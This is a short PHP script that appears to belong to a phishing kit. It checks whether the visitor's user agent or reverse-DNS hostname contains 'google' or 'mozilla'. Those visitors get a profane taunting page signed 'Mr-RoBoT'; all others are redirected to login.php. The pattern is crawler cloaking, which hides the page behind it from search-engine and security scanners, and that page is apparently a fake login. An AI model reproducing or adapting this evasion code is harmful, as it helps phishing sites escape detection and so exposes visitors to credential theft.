<?
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'mozilla') !== false){
?>
<!DOCTYPE html>
<html>
<head>
	<title>Hey Google, Fuck You By Mr-RoBoT!</title>
	<link rel="stylesheet" type="text/css" href="css/styles.css">
</head>
<body>
<div class="logo" style="top:50px;">Hey Google,</div>
<div class="logo" style="top:120px;">Fuck You By Mr-RoBoT!</div>
</body>
</html>
<?
}else{
	header("Location:login.php");
	exit();
}
?>